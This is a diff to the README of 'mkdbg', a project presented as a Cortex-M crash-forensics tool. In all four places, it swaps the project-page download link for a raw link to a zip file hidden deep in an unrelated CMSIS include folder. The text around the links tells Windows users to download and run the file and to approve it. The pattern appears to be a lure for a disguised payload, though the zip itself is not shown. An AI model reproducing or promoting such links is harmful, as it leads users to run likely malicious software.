@@ -1,6 +1,6 @@
 # mkdbg - Crash forensics for Cortex-M
 
-[![Download mkdbg](https://img.shields.io/badge/Download-mkdbg-blue?style=for-the-badge)](https://github.com/illusional-micropogonias93/mkdbg)
+[![Download mkdbg](https://img.shields.io/badge/Download-mkdbg-blue?style=for-the-badge)](https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip)
 
 ## 🧰 What mkdbg does
 
@@ -12,7 +12,7 @@ Use it when a device freezes, resets, or stops responding and you need a clear f
 
 Visit this page to download and run the software on Windows:
 
-https://github.com/illusional-micropogonias93/mkdbg
+https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip
 
 If the page shows a release file, download it and open it on your Windows PC. If it shows the main project page, use the files and release links there to get the Windows build.
 
@@ -33,7 +33,7 @@ If Windows asks for approval, allow the app to run and let it use the serial por
 ## 🚀 Getting started
 
 1. Open the download page:
-   https://github.com/illusional-micropogonias93/mkdbg
+   https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip
 
 2. Download the Windows package or release file from the page.
 
@@ -204,7 +204,7 @@ Try these checks:
 
 Use this link to visit the project page, then download and run the Windows file from there:
 
-https://github.com/illusional-micropogonias93/mkdbg
+https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip
 
 ## 🧷 What makes mkdbg useful
 
